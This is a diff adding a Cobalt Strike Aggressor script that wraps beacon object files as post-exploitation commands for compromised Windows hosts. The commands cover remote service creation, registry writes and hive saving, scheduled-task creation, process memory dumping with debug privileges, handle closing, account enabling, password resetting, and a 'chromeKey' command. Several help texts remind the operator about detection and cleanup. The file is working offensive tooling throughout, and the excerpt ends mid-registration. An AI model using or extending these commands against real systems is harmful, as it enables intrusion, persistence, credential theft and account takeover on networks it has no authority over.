@@ -1,0 +1,1363 @@
+########################################
+# Enumerations
+########################################
+
+%reghives = %(
+HKCR => 0,
+HKCU => 1,
+HKLM => 2,
+HKU  => 3
+);
+#sleep can't handle the actual values... so we'll just add them on the c side :(
+
+%regtypes = %(
+REG_SZ => 1,
+REG_EXPAND_SZ => 2,
+REG_BINARY => 3,
+REG_DWORD => 4,
+REG_MULTI_SZ => 7,
+REG_QWORD => 11
+);
+
+%inttypes = %( 
+    REG_DWORD => 1, 
+    REG_QWORD => 1
+);
+
+########################################
+# Helper functions
+########################################
+
+#readbof INPUTFILE
+sub readbof
+{
+    local('$barch $bof_filename $handle $data $args');
+    $barch  = barch($1);
+
+    # read in the right BOF file
+    $bof_filename = script_resource("$2 $+ / $+ $2 $+ . $+ $barch $+ .o");
+    println("Loading $bof_filename");
+    $handle = openf($bof_filename);
+    $data   = readb($handle, -1);
+    closef($handle);
+    if(strlen($data) == 0)
+    {
+        berror($1, "Could not read BOF file: $bof_filename");
+    }
+
+    btask($1, "Loaded $2 for $barch");
+    return $data;
+}
+
+#random_string
+sub random_string
+{
+    $limit = $1;
+    @random_str = @();
+    $characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    for ($x = 0; $x < $limit; $x++) {
+        $n = rand(strlen($characters));
+        add(@random_str, charAt($characters, $n));
+    }
+    return join('', @random_str);
+};
+
+# subrotine to parse options for script.
+# Returns options as a hash
+sub ops {
+	local('$count');
+	$count = 0;
+	%arguments = ohash();
+	foreach $arg ($1) {
+		if ($count > 0) {
+			if ($arg ismatch '/.*:.*') {
+				$arg = replace($arg, '\A/',"");
+				($key $val) = split(":", $arg, 2);
+				%arguments[$key] = $val;
+			}
+			else if ($arg ismatch '/.*') {
+				$arg = replace($arg, '\A/',"");
+				%arguments[$arg] = "TRUE";
+			}
+			else {
+				%arguments["$count"] = $arg;
+			}
+		}
+		$count = $count + 1;
+	}
+	return (%arguments);
+}
+
+########################################
+# Service Control functions
+########################################
+
+# sc_description <SVCNAME> <DESCRIPTION> <OPT:HOSTNAME>
+alias sc_description
+{
+    local('$hostname $servicename $args $desc');
+
+    if(size(@_) == 3)
+    {
+        $servicename = $2;
+        $desc = $3;
+        $hostname = $null;
+    }
+    else if (size(@_) == 4)
+    {
+        $servicename = $2;
+        $desc = $3;
+        $hostname = $4;
+    }
+    else
+    {
+        berror($1, beacon_command_detail("sc_description"));
+        return;
+    }
+
+        $args = bof_pack($1, "zzz", $hostname, $servicename, $desc);
+        beacon_inline_execute($1, readbof($1, "sc_description"), "go", $args);
+
+}
+
+beacon_command_register(
+    "sc_description",
+    "Sets the description of an existing service",
+    "
+Command: sc_description 
+Summary: This command sets the description of an existing service on the target 
+         host.
+Usage:   sc_description <SVCNAME> <DESCRIPTION> <OPT:HOSTNAME>
+         SVCNAME      Required. The name of the service to create.
+         DESCRIPTION  Required. The description of the service.
+         HOSTNAME     Optional. The host to connect to and run the commnad on. The
+                      local system is targeted if a HOSTNAME is not specified.
+"
+);
+
+#sc_config <SVCNAME> <BINPATH> <ERRORMODE> <STARTMODE> <OPT:HOSTNAME>
+sub bsc_config
+{
+    local('$hostname $servicename $binpath $errormode $startmode $bid $args');
+    $bid = $1;
+    $servicename = $2;
+    $binpath = $3;
+    $errormode = $4;
+    $startmode = $5;
+    $hostname = $6;
+    try {
+        $junk = parseNumber($errormode, 10);
+        $junk = parseNumber($startmode, 10);
+    } catch $msg{
+        berror($bid, beacon_command_detail('sc_config'));
+        berror($bid, "either ignore or startmode is not a proper number");
+        return;
+    }
+    if (($errormode < 0) || ($errormode > 3))
+    {
+        berror($bid, beacon_command_detail('sc_config'));
+        berror($bid, "ignore is not a valid value");
+        return;
+    }
+    if (($startmode < 2) || ($startmode > 4))
+    {
+        berror($bid, beacon_command_detail('sc_config'));
+        berror($bid, "startmode is not a valid value");
+        return;
+    }
+    $args = bof_pack($bid, "zzzss",  $hostname, $servicename, $binpath, $errormode, $startmode);
+    beacon_inline_execute($bid, readbof($1, "sc_config"), "go", $args);
+
+}
+
+#sc_config <SVCNAME> <BINPATH> <ERRORMODE> <STARTMODE> <OPT:HOSTNAME>
+alias sc_config
+{
+    local('$hostname $servicename $binpath $ignore $startmode $junk');
+
+    if (size(@_) == 5)
+    {
+        $servicename = $2;
+        $binpath = $3;
+        $ignore = $4;
+        $startmode = $5;
+        $hostname = $null;
+    }
+    else if(size(@_) == 6)
+    {
+        $servicename = $2;
+        $binpath = $3;
+        $ignore = $4;
+        $startmode = $5;
+        $hostname = $6;
+    }
+    else
+    {
+        berror($1, beacon_command_detail('sc_config'));
+        return;
+    }
+    bsc_config($1, $servicename, $binpath, $ignore, $startmode, $hostname);
+}
+
+beacon_command_register(
+    "sc_config",
+    "Configures an existing service",
+    "
+Command: sc_config 
+Summary: This command configures an existing service on the target host.
+Usage:   sc_config <SVCNAME> <BINPATH> <ERRORMODE> <STARTMODE> <OPT:HOSTNAME>
+         SVCNAME      Required. The name of the service to create.
+         BINPATH      Required. The binary path of the service to execute.
+         ERRORMODE    Required. The error mode of the service. The valid 
+                      options are:
+                        0 - ignore errors
+                        1 - nomral logging
+                        2 - log severe errors
+                        3 - log critical errors
+         STARTMODE    Required. The start mode for the service. The valid
+                      options are:
+                        2 - auto start
+                        3 - on demand start
+                        4 - disabled
+         HOSTNAME     Optional. The host to connect to and run the commnad on. The
+                      local system is targeted if a HOSTNAME is not specified.
+"
+);
+
+sub bsc_create
+{
+    local('$hostname $servicename $binpath $errormode $startmode $junk $desc $displayname $bid $args');
+    $bid = $1;
+    $servicename = $2;
+    $displayname = $3;
+    $binpath = $4;
+    $desc = $5;
+    $errormode = $6;
+    $startmode = $7;
+    $hostname = $8;
+
+
+    try {
+        $junk = parseNumber($errormode, 10);
+        $junk = parseNumber($startmode, 10);
+    } catch $msg{
+        berror($bid, beacon_command_detail('sc_create'));
+        berror($bid, "either errormode or startmode is not a proper number");
+        return;
+    }
+    if (($errormode < 0) || ($errormode > 3))
+    {
+        berror($bid, beacon_command_detail('sc_create'));
+        berror($bid, "errormode is not a valid value");
+        return;
+    }
+    if (($startmode < 2) || ($startmode > 4))
+    {
+        berror($bid, beacon_command_detail('sc_create'));
+        berror($bid, "startmode is not a valid value");
+        return;
+    }
+    $args = bof_pack($bid, "zzzzzss",  $hostname, $servicename, $binpath, $displayname, $desc, $errormode, $startmode);
+    beacon_inline_execute($bid, readbof($bid, "sc_create"), "go", $args);
+}
+
+
+#sc_create <SVCNAME> <DISPLAYNAME> <BINPATH> <DESCRIPTION> <ERRORMODE> <STARTMODE> <OPT:HOSTNAME>
+alias sc_create
+{
+    local('$hostname $servicename $binpath $ignore $startmode $junk $desc $displayname');
+
+    if (size(@_) == 7)
+    {
+        $servicename = $2;
+        $displayname = $3;
+        $binpath = $4;
+        $desc = $5;
+        $ignore = $6;
+        $startmode = $7;
+        $hostname = $null;
+    }
+    else if(size(@_) == 8)
+    {
+        $servicename = $2;
+        $displayname = $3;
+        $binpath = $4;
+        $desc = $5;
+        $ignore = $6;
+        $startmode = $7;
+        $hostname = $8;
+    }
+    else
+    {
+        berror($1, beacon_command_detail('sc_create'));
+        return;
+    }
+
+    bsc_create($1, $servicename, $displayname, $binpath, $desc, $ignore, $startmode, $hostname);
+}
+
+beacon_command_register(
+    "sc_create",
+    "Creates a new service",
+    "
+Command: sc_create 
+Summary: This command creates a service on the target host.
+Usage:   sc_create <SVCNAME> <DISPLAYNAME> <BINPATH> <DESCRIPTION> <ERRORMODE> <STARTMODE> <OPT:HOSTNAME>
+         SVCNAME      Required. The name of the service to create.
+         DISPLAYNAME  Required. The display name of the service.
+         BINPATH      Required. The binary path of the service to execute.
+         DESCRIPTION  Required. The description of the service.
+         ERRORMODE    Required. The error mode of the service. The valid 
+                      options are:
+                        0 - ignore errors
+                        1 - nomral logging
+                        2 - log severe errors
+                        3 - log critical errors
+         STARTMODE    Required. The start mode for the service. The valid
+                      options are:
+                        2 - auto start
+                        3 - on demand start
+                        4 - disabled
+         HOSTNAME     Optional. The host to connect to and run the commnad on. The
+                      local system is targeted if a HOSTNAME is not specified.
+"
+);
+
+
+#sc_delete <SVCNAME> <OPT:HOSTNAME>
+alias sc_delete
+{
+    local('$hostname $servicename $args');
+
+
+    if(size(@_) == 2)
+    {
+        $servicename = $2;
+        $hostname = $null;
+    }
+    else if (size(@_) == 3)
+    {
+        $servicename = $2;
+        $hostname = $3;
+    }
+    else
+    {
+        berror($1, beacon_command_detail("sc_delete"));
+        return;
+    }
+
+
+    $args = bof_pack($1, "zz", $hostname, $servicename);
+    beacon_inline_execute($1, readbof($1, "sc_delete"), "go", $args);
+}
+
+beacon_command_register(
+    "sc_delete",
+    "Deletes a service",
+    "
+Command: sc_delete 
+Summary: This command deletes the specified service on the target host.
+Usage:   sc_delete <SVCNAME> <OPT:HOSTNAME>
+         SVCNAME  Required. The name of the service to delete.
+         HOSTNAME Optional. The host to connect to and run the commnad on. The
+                  local system is targeted if a HOSTNAME is not specified.
+"
+);
+
+sub bsc_stop
+{
+    local('$hostname $servicename $args $bid');
+    $bid = $1;
+    $servicename = $2;
+    $hostname = $3;
+
+    $args = bof_pack($1, "zz", $hostname, $servicename);
+    beacon_inline_execute($1, readbof($1, "sc_stop"), "go", $args);
+}
+
+#sc_stop <SVCNAME> <OPT:HOSTNAME>
+alias sc_stop
+{
+    local('$hostname $servicename $args');
+
+
+    if(size(@_) == 2)
+    {
+        $servicename = $2;
+        $hostname = $null;
+    }
+    else if (size(@_) == 3)
+    {
+        $servicename = $2;
+        $hostname = $3;
+    }
+    else
+    {
+        berror($1, beacon_command_detail("sc_stop"));
+        return;
+    }
+    bsc_stop($1, $servicename, $hostname);
+}
+
+beacon_command_register(
+    "sc_stop",
+    "Stops a service",
+    "
+Command: sc_stop 
+Summary: This command stops the specified service on the target host.
+Usage:   sc_stop <SVCNAME> <OPT:HOSTNAME>
+         SVCNAME  Required. The name of the service to stop.
+         HOSTNAME Optional. The host to connect to and run the commnad on. The
+                  local system is targeted if a HOSTNAME is not specified.
+"
+);
+
+sub bsc_start
+{
+    local('$bid $hostname $servicename $args');
+    $bid = $1;
+    $servicename = $2;
+    $hostname = $3;
+    $args = bof_pack($bid, "zz", $hostname, $servicename);
+    beacon_inline_execute($bid, readbof($bid, "sc_start"), "go", $args);   
+}
+
+
+#sc_start <SVCNAME> <OPT:HOSTNAME>
+alias sc_start
+{
+    local('$hostname $servicename $args');
+
+
+    if(size(@_) == 2)
+    {
+        $servicename = $2;
+        $hostname = $null;
+    }
+    else if (size(@_) == 3)
+    {
+        $servicename = $2;
+        $hostname = $3;
+    }
+    else
+    {
+        berror($1, beacon_command_detail("sc_start"));
+        return;
+    }
+
+
+    $args = bof_pack($1, "zz", $hostname, $servicename);
+    beacon_inline_execute($1, readbof($1, "sc_start"), "go", $args);
+}
+
+beacon_command_register(
+    "sc_start",
+    "Starts a service",
+    "
+Command: sc_start 
+Summary: This command starts the specified service on the target host.
+Usage:   sc_start <SVCNAME> <OPT:HOSTNAME>
+         SVCNAME  Required. The name of the service to start.
+         HOSTNAME Optional. The host to connect to and run the command on. The
+                  local system is targeted if a HOSTNAME is not specified.
+"
+);
+
+########################################
+# Registry commands
+########################################
+#yeah I'm not dealing with this one (sub vs alias)
+sub breg_set 
+{
+    local('$hostname $hive $path $key $type $i $value $packstr $regstr $buffer $fp');
+    
+    $packstr = "zizzi";
+    
+    if(size(@_) < 5)
+    {
+        berror($1, beacon_command_detail("reg_set"));
+        return;
+    }
+    else
+    {
+        if($2 in %reghives)
+        {
+            #targeting local system
+            $hostname = $null;
+            $i = 1;
+        }
+        else{
+            $hostname = "\\\\" . $2;
+            $i = 2;
+        }
+        if (@_[$i] in %reghives)
+        {
+            $hive = %reghives[@_[$i]];
+            $i++;
+        }
+        else
+        {
+            berror($1, beacon_command_detail("reg_set"));
+            berror($1, "Provided registry hive value is invalid");
+            return;
+        }
+        $path = @_[$i];
+        $i++;
+        $key = @_[$i];
+        $i++;
+        if( @_[$i] in %regtypes)
+        {
+            $regstr = @_[$i];
+            $type = %regtypes[@_[$i]];
+            $i++;
+            if ($regstr in %inttypes)
+            {
+                $packstr = $packstr . "b";
+                $value =  pack("I-", @_[$i]);
+            }
+            else if ($regstr eq "REG_MULTI_SZ")
+            {
+                $packstr = $packstr . "b";
+                $buffer = allocate(0);
+                for (; $i < size(@_); $i++)
+                {
+                    bwrite($buffer, "z", @_[$i]);
+                }
+                bwrite($buffer, "z", ""); # null terminator at end
+                closef($buffer);
+                $value = readb($buffer, -1);
+                
+            }
+            else if ($regstr eq "REG_EXPAND_SZ" || $regstr eq "REG_SZ")
+            {
+                $packstr = $packstr . "z";
+                $value = @_[$i];
+            }
+            else if ($regstr eq "REG_BINARY")
+            {
+                if (!-canread @_[$i])
+                {
+                    berror($1, "File " . @_[$i] . " Could not be found");
+                    return;
+                }
+                $fp = openf(@_[$i]);
+                $value = readb($fp, -1);
+                $packstr = $packstr . "b";
+                closef($fp);
+            }
+        }
+        else
+        {
+            berror($1, beacon_command_detail("reg_set"));
+            berror($1, "Provided registry type value is invalid");
+            return;
+        }
+        $args = bof_pack($1, $packstr, $hostname, $hive, $path, $key, $type, $value);
+        
+        beacon_inline_execute($1, readbof($1, "reg_set"), "go", $args);
+    }
+}
+
+#reg_set reg_set <OPT:HOSTNAME> <HIVE> <KEY> <VALUE> <TYPE> <DATA>
+alias reg_set
+{
+    # I need hostname Hive, path, key type value(s)
+    # test if val in pos 1 is in Hive, if not, then assume it is a hostname
+    # values at end, if multisz pack them using a variable bof string
+
+    local('$hostname $hive $path $key $type $i $value $packstr $regstr $buffer $fp');
+    
+    $packstr = "zizzi";
+    
+    if(size(@_) < 5)
+    {
+        berror($1, beacon_command_detail("reg_set"));
+        return;
+    }
+    else
+    {
+        if($2 in %reghives)
+        {
+            #targeting local system
+            $hostname = $null;
+            $i = 1;
+        }
+        else{
+            $hostname = "\\\\" . $2;
+            $i = 2;
+        }
+        if (@_[$i] in %reghives)
+        {
+            $hive = %reghives[@_[$i]];
+            $i++;
+        }
+        else
+        {
+            berror($1, beacon_command_detail("reg_set"));
+            berror($1, "Provided registry hive value is invalid");
+            return;
+        }
+        $path = @_[$i];
+        $i++;
+        $key = @_[$i];
+        $i++;
+        if( @_[$i] in %regtypes)
+        {
+            $regstr = @_[$i];
+            $type = %regtypes[@_[$i]];
+            $i++;
+            if ($regstr in %inttypes)
+            {
+                $packstr = $packstr . "b";
+                $value =  pack("I-", @_[$i]);
+            }
+            else if ($regstr eq "REG_MULTI_SZ")
+            {
+                $packstr = $packstr . "b";
+                $buffer = allocate(0);
+                for (; $i < size(@_); $i++)
+                {
+                    bwrite($buffer, "z", @_[$i]);
+                }
+                bwrite($buffer, "z", ""); # null terminator at end
+                closef($buffer);
+                $value = readb($buffer, -1);
+                
+            }
+            else if ($regstr eq "REG_EXPAND_SZ" || $regstr eq "REG_SZ")
+            {
+                $packstr = $packstr . "z";
+                $value = @_[$i];
+            }
+            else if ($regstr eq "REG_BINARY")
+            {
+                if (!-canread @_[$i])
+                {
+                    berror($1, "File " . @_[$i] . " Could not be found");
+                    return;
+                }
+                $fp = openf(@_[$i]);
+                $value = readb($fp, -1);
+                $packstr = $packstr . "b";
+                closef($fp);
+            }
+        }
+        else
+        {
+            berror($1, beacon_command_detail("reg_set"));
+            berror($1, "Provided registry type value is invalid");
+            return;
+        }
+        $args = bof_pack($1, $packstr, $hostname, $hive, $path, $key, $type, $value);
+        
+        beacon_inline_execute($1, readbof($1, "reg_set"), "go", $args);
+    }
+}
+
+beacon_command_register(
+    "reg_set",
+    "Creates or sets a registry key or value",
+    "
+Command: reg_set 
+Summary: This command creates or sets the specified registry key (or value) on
+         the target host.
+Usage:   reg_set <OPT:HOSTNAME> <HIVE> <KEY> <VALUE> <TYPE> <DATA>
+         HOSTNAME Optional. The host to connect to and run the commnad on.
+         HIVE     Required. The registry hive containing the REGPATH. Possible 
+                  values:
+                    HKLM
+                    HKCU
+                    HKU
+                    HKCR
+         KEY      Required. The registry path. 
+         VALUE    Required. The value name. If you want to create/set the 
+                  default key, use \"\".                  
+         TYPE     Required. The type of registry value to create/set. The valid
+                  options are:
+                    REG_SZ
+                    REG_EXPAND_SZ
+                    REG_BINARY
+                    REG_DWORD
+                    REG_MULTI_SZ
+                    REG_QWORD
+         DATA     Required. The data to store in the registry value.
+Note: For REG_BINARY, the VALUE must be the name of a file on disk which will 
+      read in and its contents used.
+Note: For REG_MULTI_SZ, the VALUE must be specified as a space separated list 
+      of quoted strings.
+Note: For REG_QWORD, the VALUE must be less than a DWORD (due to limitation of
+      sleep language).
+"
+);
+
+
+#reg_delete <OPT:HOSTNAME> <HIVE> <REGPATH> <OPT:REGVALUE>
+alias reg_delete
+{
+    # I need hostname Hive, path, key type value(s)
+    # test if val in pos 1 is in Hive, if not, then assume it is a hostname
+    # values at end, if multisz pack them using a variable bof string
+
+    local('$hostname $hive $path $key $i $delkey')
+
+    if(size(@_) < 3)
+    {
+        berror($1, beacon_command_detail("reg_delete"));
+        return;
+    }
+    else
+    {
+        if($2 in %reghives)
+        {
+            #targeting local system
+            $hostname = $null;
+            $i = 1;
+        }
+        else
+        {
+            $hostname = "\\\\" . $2;
+            $i = 2;
+        }
+        if (@_[$i] in %reghives)
+        {
+            $hive = %reghives[@_[$i]];
+            $i++;
+        }
+        else
+        {
+            berror($1, beacon_command_detail("reg_delete"));
+            berror($1, "Provided registry hive value is invalid");
+            return;
+        }
+        $path = @_[$i];
+        $i++;
+        if($i < size(@_))
+        {
+            $delkey = 0;
+            $key = @_[$i];
+            println("set subkey value to delete to $key");
+        }
+        else
+        {
+            $delkey = 1;
+            $key = "";
+        }
+
+        $args = bof_pack($1, "zizzi", $hostname, $hive, $path, $key, $delkey);
+        beacon_inline_execute($1, readbof($1, "reg_delete"), "go", $args);
+    }
+}
+
+beacon_command_register(
+    "reg_delete",
+    "Deletes the registry key or value",
+    "
+Command: reg_delete 
+Summary: This command deletes the specified registry key (or value) on the 
+         target host.
+Usage:   reg_delete <OPT:HOSTNAME> <HIVE> <REGPATH> <OPT:REGVALUE>
+         HOSTNAME Optional. The host to connect to and run the commnad on.
+         HIVE     Required. The registry hive containing the REGPATH. Possible 
+                  values:
+                    HKLM
+                    HKCU
+                    HKU
+                    HKCR
+         REGPATH  Required. The registry path (deleted if value not given).
+         REGVALUE Optional. The registry value to delete. If the value is not 
+                  specified, then the whole key is deleted. If you want to 
+                  delete the default key, use \"\" as the REGVALUE.
+"
+);
+
+
+#reg_save <HIVE> <REGPATH> <FILEOUT>
+alias reg_save
+{
+    if(size(@_) != 4)
+    {
+        berror($1, beacon_command_detail("reg_save"));
+        return;
+    }
+    else
+    {
+        breg_save($1, $2, $3, $4);
+    }
+}
+
+sub breg_save
+{
+    local('$hive $regpath $output $i')
+
+    $hive = %reghives[$2];
+    $regpath = $3;
+    $output = $4;
+
+    blog($1, "Requesting to backup privileges");
+    bgetprivs($1, "SeBackupPrivilege");
+
+    blog($1, "Attempting to save registry key $2\\$regpath to location $output");
+    $args = bof_pack($1, "zzi", $regpath, $output, $hive);
+    beacon_inline_execute($1, readbof($1, "reg_save"), "go", $args);
+
+}
+
+beacon_command_register(
+    "reg_save",
+    "Saves the registry path and all subkeys to disk",
+    "
+Command: reg_save 
+Summary: This command saves the specified registry path (and all subkeys) to a
+         file on the target system.
+Usage:   reg_save <HIVE> <REGPATH> <FILEOUT>
+         HIVE     Required. The registry hive containing the REGPATH. Possible 
+                  values:
+                    HKLM
+                    HKCU
+                    HKU
+                    HKCR
+         REGPATH  Required. The registry path to save.
+         FILEOUT  Required. The output file. 
+Note:    The FILEOUT is saved to disk on target, so don't forget to clean up.
+"
+);
+
+
+
+########################################
+# Schedule Task functions
+########################################
+
+#schtaskscreate <OPT:HOSTNAME> <TASKPATH> <USERMODE> <FORCEMODE>
+alias schtaskscreate
+{
+    local('$server $taskpath $taskxml $dialog $fpath $fp $bid $fdata $mode $index $force $args');
+    $bid = $1;
+    $server = "";
+    $fp = $null;
+
+    if(size(@_) == 4)
+    {
+        $taskpath = $2;
+        $mode = $3;
+    }
+    else if(size(@_) == 5)
+    {
+        $server = $2;
+        $taskpath = $3;
+        $mode = $4;
+    }
+    else
+    {
+        berror($bid, beacon_command_detail("schtaskscreate"));
+        berror($bid, "Inavlid usage");
+        return;
+    }
+
+    if($mode eq "USER")
+    {
+        $mode = 0;
+    }
+    else if($mode eq "SYSTEM")
+    {
+        $mode = 1;
+    }
+    else if ($mode eq "XML")
+    {
+        $mode = 2;
+    }
+    else
+    {
+        berror($bid, beacon_command_detail("schtaskscreate"));
+        berror($bid, "Must provide USER, SYSTEM, or XML (case sensitive)");
+        return;
+    }
+
+    if(@_[size(@_) -1] eq "UPDATE")
+    {
+        $force = 1;
+    }
+    else if (@_[size(@_) -1] eq "CREATE")
+    {
+        $force = 0;
+    }
+    else
+    {
+        berror($1, beacon_command_detail("schtaskscreate"));
+        berror($1, "Must provide CREATE or UPDATE (case sensitive)");
+        return;
+    }
+
+    prompt_file_open("Please select the xml task definition", $null, false, $this);
+    yield;
+    $fpath = $1;
+    if(!-canread $fpath)
+    {
+        berror($bid, "Unable to read the xml task definition file: $fpath");
+        return;
+    }
+    $fp = openf($fpath);
+    $fdata = readb($fp, -1);
+    closef($fp);
+
+    $args = bof_pack($bid, "ZZZii", $server, $taskpath, $fdata, $mode, $force);
+    beacon_inline_execute($bid, readbof($bid, "schtaskscreate"), "go", $args);
+}
+
+beacon_command_register(
+    "schtaskscreate",
+    "Creates a new scheduled task",
+    "
+Command: schtaskscreate
+Summary: This command attempts to create or update a scheduled task given an
+         XML task definition.         
+Usage:   schtaskscreate <OPT:HOSTNAME> <TASKPATH> <USERMODE> <FORCEMODE>
+         HOSTNAME  Optional. The system on which to create the task.
+         TASKPATH  Required. The path for the created task.
+         USERMODE  Required. The username to associate with the task. The valid
+                   options are (case sensitive):
+                     USER uses the current user
+                     XML uses the principal user from the task XML
+                     SYSTEM uses the Local System service
+         FORCEMODE Required. Creation disposition. The options are (case 
+                   sensitive):
+                     CREATE fail if the task already exists
+                     UPDATE update an exiting task 
+Note:    Please see https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-schema-elements 
+         for the base xml definitions. More formed examples start here 
+         https://docs.microsoft.com/en-us/windows/win32/taskschd/time-trigger-example--xml-
+"
+);
+
+
+#schtasksdelete <OPT:HOSTNAME> <TASKNAME> <TYPE>
+alias schtasksdelete
+{
+    local('$bid $args $server $taskname $isfolder')
+    $bid = $1;
+    $server = "";
+    
+    if ( size(@_) < 3)
+    {
+        berror($bid, "Invalid Usage");
+        berror($bid, beacon_command_detail("schtasksdelete"));
+        return;
+    }
+    else if(size(@_) == 3)
+    {
+        $taskname = $2;
+    }
+    else if(size(@_) == 4)
+    {
+        $server = $2;
+        $taskname = $3;
+    }
+    else 
+    {
+        berror($bid, "Invalid Usage");
+        berror($bid, beacon_command_detail("schtasksdelete"));
+        return;
+    }
+    
+    if(@_[size(@_) -1] eq "TASK")
+    {
+        $isfolder = 0;
+    }
+    else if (@_[size(@_) -1] eq "FOLDER")
+    {
+        $isfolder = 1;
+    }
+    else
+    {
+        berror($bid, beacon_command_detail("schtasksdelete"));
+        berror($bid, "Must provide TASK or FOLDER (case sensitive)");
+        return;
+    }
+    
+    $args = bof_pack($bid, "ZZi", $server, $taskname, $isfolder);
+    beacon_inline_execute($bid, readbof($bid, "schtasksdelete"), "go", $args);
+}
+
+beacon_command_register(
+    "schtasksdelete",
+    "Deletes the specified scheduled task or folder",
+    "
+Command: schtasksdelete
+Summary: This command deletes a scheduled task or folder.
+Usage:   schtasksdelete <OPT:HOSTNAME> <TASKNAME> <TYPE>
+         HOSTNAME Optional. The target system (local system if not specified)
+         TASKNAME Required. The task or folder name.
+         TYPE     Required. The type of target to delete. Valid options are:
+                    FOLDER
+                    TASK
+Note:    If you are deleting a folder, it must be empty.
+         If you are deleting a task, the full path including the task name must
+         be given, e.g.:
+             schtasksdelete \\Microsoft\\Windows\\MUI\\LpRemove TASK
+             schtasksdelete \\some\\random\\task\\folder FOLDER
+"
+);
+
+
+#schtasksstop <OPT:HOSTNAME> <TASKNAME>
+alias schtasksstop
+{
+    local('$bid $args $server $taskname')
+    $bid = $1;
+    $server = "";
+    if ( size(@_) < 2)
+    {
+        berror($bid, "Invalid Usage");
+        berror($bid, beacon_command_detail("schtasksstop"));
+        return;
+    } else if(size(@_) == 2)
+    {
+        $taskname = $2;
+    } else if(size(@_) == 3)
+    {
+        $server = $2;
+        $taskname = $3;
+    } else 
+    {
+        berror($bid, "Invalid Usage");
+        berror($bid, beacon_command_detail("schtasksstop"));
+        return;
+    }
+    $args = bof_pack($bid, "ZZ", $server, $taskname);
+    beacon_inline_execute($bid, readbof($bid, "schtasksstop"), "go", $args);
+}
+
+beacon_command_register(
+    "schtasksstop",
+    "Stops the specified scheduled task",
+    "
+Command: schtasksstop
+Summary: This command stops a scheduled task.
+Usage:   schtasksstop <OPT:HOSTNAME> <TASKNAME>
+         HOSTNAME  Optional. The target system (local system if not specified)
+         TASKNAME  Required. The scheduled task name.
+Note:    The full path including the task name must be given, e.g.:
+             schtasksstop \\Microsoft\\Windows\\MUI\\LpRemove
+             schtasksstop \\Microsoft\\windows\\MUI\\totallyreal
+"
+);
+
+
+
+########################################
+# Process functions
+########################################
+
+#procdump <PID> <FILEOUT>
+alias procdump
+{
+    local('$args $pid $target');
+    
+    if (size(@_) != 3)
+    {
+        berror($1, beacon_command_detail("procdump"));
+        berror($1, "Invalid number of arguments");
+        return;
+    }
+    
+    blog($1, "Requesting to enable debug privs");
+    bgetprivs($1, "SeDebugPrivilege");
+
+    blog($1, "Attempting to dump pid $2 to location $3");
+    $args = bof_pack($1, "iZ", $2, $3);
+    beacon_inline_execute($1, readbof($1, "procdump"), "go", $args);
+}
+
+beacon_command_register(
+    "procdump",
+    "Dumps the specified process to the specified output file",
+    "
+Command: procdump
+Summary: This command attempts to dump a process using MiniDumpWriteDump. It 
+         writes the output to the file location specified.
+Usage:   procdump <PID> <FILEOUT>
+         PID     Required. The process to dump.
+         FILEOUT Required. The output path to write the dump to. Remember to 
+                 delete this file.
+Warning: This command may very well get caught, but is here as an option regardless.
+"
+);
+
+
+#ProcessListHandles <PID>
+alias ProcessListHandles
+{
+    if(size(@_) != 2)
+    {
+        berror($1, "Invalid number of arguments");
+        berror($1, beacon_command_detail("ProcessListHandles"));
+        return;
+    }
+    beacon_inline_execute($1, readbof($1, "ProcessListHandles"), "go", bof_pack($1, "i", $2));
+}
+
+beacon_command_register(
+    "ProcessListHandles",
+    "Lists open handles in process",
+    "
+Command: ProcessListHandles
+Summary: Lists all open handles in a specified process.
+Usage:   ProcessListHandles <PID>
+         PID    Required. The process to list the handles of. You must have 
+                permission to open the specified process.
+"
+);
+
+
+#ProcessDestroy <PID> <OPT:HANDLEID>
+alias ProcessDestroy
+{
+    local('$handle');
+    if(size(@_) < 2)
+    {
+        berror($1, "Invalid number of arguments");
+        berror($1, beacon_command_detail("ProcessDestroy"));
+        return;
+    }
+    $handle = iff(-istrue $3, $3, 0);
+    if($handle < 0 || $handle > 65535)
+    {
+        berror($1, "Invalid HANDLEID");
+        berror($1, beacon_command_detail("ProcessDestroy"));
+        return;
+    }
+    beacon_inline_execute($1, readbof($1, "ProcessDestroy"), "go", bof_pack($1, "ii", $2, $handle));
+}
+
+beacon_command_register(
+    "ProcessDestroy",
+    "Closes handle(s) in a process",
+    "
+Command: ProcessDestroy
+Summary: Closes specified handle in a specified process, or closes all handles 
+         if one is not specified.
+Usage:   ProcessDestroy <PID> <OPT:HANDLEID>
+         PID       Required. The process to list the handles of. You must have 
+                   permission to open the specified process.
+         HANDLEID: Optional. The specific handle ID to close, or close all 
+                   handles if not specified. The values for HANDLEID must be 
+                   between 1 - 65535.
+"
+);
+
+
+
+########################################
+# User account functions
+########################################
+
+#enableuser <USERNAME> <DOMAIN>
+alias enableuser
+{
+    if(size(@_) != 3)
+    {
+        berror($1, beacon_command_detail("enableuser"));
+        berror($1, "Invalid number of parameters");
+        return;
+    }
+    beacon_inline_execute($1, readbof($1, "enableuser"), "go", bof_pack($1, "ZZ", $3, $2));
+}
+
+beacon_command_register(
+    "enableuser",
+    "Enables and unlocks the specified user account",
+    "
+Command: enableuser
+Summary: Activates (and if necessary enables) the specified user account on the
+         target computer. 
+Usage:   enableuser <USERNAME> <DOMAIN>
+         USERNAME  Required. The user name to activate/enable. 
+         DOMAIN    Required. The domain/computer for the account. You must give 
+                   the domain name for the user if it is a domain account, or
+                   use \"\" to target an account on the local machine.
+"
+);
+
+
+#setuserpass <USERNAME> <PASSWORD> <DOMAIN>
+alias setuserpass
+{
+    if(size(@_) != 4)
+    {
+        berror($1, beacon_command_detail("setuserpass"));
+        berror($1, "Invalid number of parameters");
+        return;
+    }
+    beacon_inline_execute($1, readbof($1, "setuserpass"), "go", bof_pack($1, "ZZZ", $4, $2, $3));
+}
+
+beacon_command_register(
+    "setuserpass",
+    "Sets the specified user\'s password",
+    "
+Command: setuserpass
+Summary: Sets the password for the specified user account on the target 
+         computer. 
+Usage:   setuserpass <USERNAME> <PASSWORD> <DOMAIN>
+         USERNAME  Required. The user name to activate/enable. 
+         PASSWORD  Required. The new password. The password must meet GPO 
+                   requirements.
+         DOMAIN    Required. The domain/computer for the account. You must give 
+                   the domain name for the user if it is a domain account, or
+                   use \"\" to target an account on the local machine.
+"
+);
+    
+
+
+
+
+#chromeKey
+alias chromeKey{
+    beacon_inline_execute($1, readbof($1, "chromeKey"), "go", $null);
+}
+
+beacon_command_register(
+    "chromeKey",
